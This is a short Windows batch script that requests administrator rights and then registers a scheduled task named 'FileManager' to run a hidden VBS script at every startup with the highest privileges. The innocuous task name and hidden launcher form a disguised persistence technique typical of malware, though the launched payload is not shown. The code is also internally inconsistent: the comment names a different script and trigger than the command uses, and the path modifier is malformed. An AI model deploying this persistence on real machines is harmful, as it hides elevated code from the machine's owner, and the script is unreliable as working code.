@echo off
:: Check for admin rights
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Requesting administrative privileges...
    powershell -Command "Start-Process -FilePath '%~f0' -Verb runAs"
    exit /b
)

REM Creates a Task Scheduler task to run run_hidden.vbs on user logon

schtasks /Create /TN "FileManager" /TR "\"%~dpx0run_invs.vbs\"" /SC ONSTART /RL HIGHEST /F

echo Task Scheduler entry created.
pause